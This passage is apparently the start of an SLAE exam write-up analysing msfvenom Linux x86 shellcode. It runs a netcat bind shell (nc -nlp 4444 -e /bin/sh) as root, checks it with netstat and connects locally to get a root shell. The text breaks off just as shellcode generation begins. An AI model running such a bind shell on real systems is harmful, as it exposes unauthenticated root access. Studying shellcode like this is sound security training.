![](/msfLogo.png)

For the 5th assignment of the SLAE Exam, I will be analyzing 3 different linux x86 shellcodes created with MSF Venom.
The first will be the payload: /linux/x86/exec
The command being executed will be: nc -nlp 4444 -e "/bin/sh" &
  - This will create a bind shell, on TCP port 4444, on all network interfaces, and then background the process.
Testing out the command:
```c
root@zed# nc -nlp 4444 -e "/bin/sh" &
[1] 9119
root@zed# netstat -tnalp | grep nc
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      9119/nc
```
We can see that the command successfully ran and was given the process ID 9119 and the job ID of 1.
Using netstat we see that the process nc is successfully listening on all interfaces (0.0.0.0), on TCP port 4444.
Since the job is running in the background, we can use the same terminal window to access our /bin/sh listening on all interfaces, by using netcat to connect to the localhost interface (127.0.0.1) on TCP port 4444.
```c
root@zed# nc 127.0.0.1 4444
id
uid=0(root) gid=0(root) groups=0(root),46(plugdev)
```
We successfully are able to run commands with our netcat, bind shell.

Now we will use msfvenom to create a shellcode to execute our netcat, bind shell command.
```c

